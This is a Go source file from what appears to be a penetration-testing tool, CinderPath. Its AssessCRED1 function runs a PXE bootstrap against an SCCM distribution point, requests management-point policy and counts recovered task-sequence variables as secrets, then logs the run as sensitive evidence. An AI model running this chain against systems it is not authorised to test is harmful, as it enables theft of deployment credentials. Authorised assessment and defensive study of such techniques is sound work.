package app

import (
	"context"
	"crypto/sha256"
	"fmt"
	"net"
	"net/netip"
	neturl "net/url"
	"os"
	"strings"
	"time"

	"github.com/Lmarkussen/CinderPath/internal/cred1"
	"github.com/Lmarkussen/CinderPath/internal/database"
	"github.com/Lmarkussen/CinderPath/internal/models"
	"github.com/Lmarkussen/CinderPath/internal/version"
)

type CRED1Outcome struct {
	Run                 models.Run
	TargetIP, Interface string
	Identity            cred1.BootstrapIdentity
	Result              cred1.PolicyResult
}

// AssessCRED1 executes the bounded CRED-1 chain against one explicit target.
func (a *Application) AssessCRED1(ctx context.Context, target string) (CRED1Outcome, error) {
	var out CRED1Outcome
	lookupTarget := cred1LookupTarget(target)
	ips, err := net.DefaultResolver.LookupNetIP(ctx, "ip4", lookupTarget)
	if err != nil || len(ips) == 0 {
		return out, fmt.Errorf("CRED-1 target resolution: %w", err)
	}
	dp := ips[0].Unmap()
	if !dp.Is4() {
		return out, fmt.Errorf("CRED-1 target is not IPv4")
	}
	iface, err := routeInterface(dp)
	if err != nil {
		return out, err
	}
	store, err := database.Open(ctx, a.Config.DBPath)
	if err != nil {
		return out, err
	}
	defer store.Close()
	run, err := store.CreateRun(ctx, "assess CRED-1", string(a.Config.Profile), version.Current().Version, []string{"assess", "CRED-1", "--target", target})
	if err != nil {
		return out, err
	}
	identity, err := cred1.AcquireBootstrap(ctx, iface, dp)
	if err != nil {
		_ = store.FinishRun(context.WithoutCancel(ctx), run.ID, models.RunFailed, map[string]any{"stage": "pxe_bootstrap", "error": err.Error()})
		return out, err
	}
	// Use the explicitly selected transport endpoint. The PXE-provided logical
	// MP hostname is retained as HTTP Host, preventing stale DNS from silently
	// redirecting an evidenced MP path.
	result, err := (cred1.MPClient{BaseURL: "http://" + dp.String(), Host: hostFromURL(identity.ManagementPoint)}).ExecutePolicyPath(identity, time.Now())
	if err != nil {
		_ = store.FinishRun(context.WithoutCancel(ctx), run.ID, models.RunFailed, map[string]any{"stage": "mp_policy", "error": err.Error()})
		return out, err
	}
	data := map[string]any{"dp": dp.String(), "interface": iface, "mp_logical": identity.ManagementPoint, "site": identity.SiteCode, "media_guid": identity.MediaGUID, "unknown_machine_guid": identity.UnknownX64GUID, "certificate": result.Certificate, "assignment_count": len(result.Assignments), "policy_ids": policyIDs(result.Policies), "task_sequence_count": len(result.TaskSequences)}
	ev := &models.Evidence{Type: "cred1_pxe_policy", Title: "CRED-1 PXE policy recovery", Summary: "Fresh PXE bootstrap and task-sequence policy recovered", Data: data, SourceModule: "cred1", CollectedAt: time.Now().UTC(), Sensitivity: models.SensitivitySensitive, RunID: run.ID, Fingerprint: fmt.Sprintf("%x", sha256.Sum256([]byte(dp.String()+identity.MediaGUID)))}
	_, _ = store.UpsertEvidence(ctx, ev)
	_ = store.FinishRun(context.WithoutCancel(ctx), run.ID, models.RunCompleted, map[string]any{"cred1": ev.ID, "secret_count": countCRED1Secrets(result), "live_policy_requests": 1})
	out = CRED1Outcome{Run: *run, TargetIP: dp.String(), Interface: iface, Identity: identity, Result: result}
	return out, nil
}

func cred1LookupTarget(target string) string {
	// Preserve the logical SCCM authority while using an explicitly evidenced
	// transport address when local DNS is stale (the same authority/transport
	// split used by RECON-3 and RECON-4).
	if authority, transport := os.Getenv("CINDERPATH_CONFIGMGR_AUTHORITY"), os.Getenv("CINDERPATH_CONFIGMGR_TRANSPORT_IP"); authority != "" && transport != "" && strings.EqualFold(strings.TrimSuffix(authority, "."), strings.TrimSuffix(target, ".")) {
		return transport
	}
	return target
}
func routeInterface(dst netip.Addr) (string, error) {
	c, e := net.DialUDP("udp4", nil, &net.UDPAddr{IP: dst.AsSlice(), Port: 4011})
	if e != nil {
		return "", fmt.Errorf("CRED-1 cannot find a route to PXE DP %s; add an IPv4 route to the authorized DP before assessment: %w", dst, e)
	}
	defer c.Close()
	local := c.LocalAddr().(*net.UDPAddr).IP
	for _, i := range mustInterfaces() {
		for _, a := range mustAddrs(i) {
			ip, _, _ := net.ParseCIDR(a.String())
			if ip.Equal(local) {
				return i.Name, nil
			}
		}
	}
	return "", fmt.Errorf("CRED-1 cannot select a capture interface for the route to PXE DP %s; use a host with an IPv4 interface on the authorized DP route", dst)
}
func mustInterfaces() []net.Interface      { x, _ := net.Interfaces(); return x }
func mustAddrs(i net.Interface) []net.Addr { x, _ := i.Addrs(); return x }
func hostFromURL(v string) string {
	u, _ := neturl.Parse(v)
	if u == nil {
		return ""
	}
	return u.Host
}
func policyIDs(v []cred1.PolicyReference) []string {
	o := make([]string, 0, len(v))
	for _, x := range v {
		o = append(o, x.ID)
	}
	return o
}
func countCRED1Secrets(r cred1.PolicyResult) int {
	n := 0
	for _, s := range r.TaskSequences {
		n += len(s.Variables)
	}
	return n
}
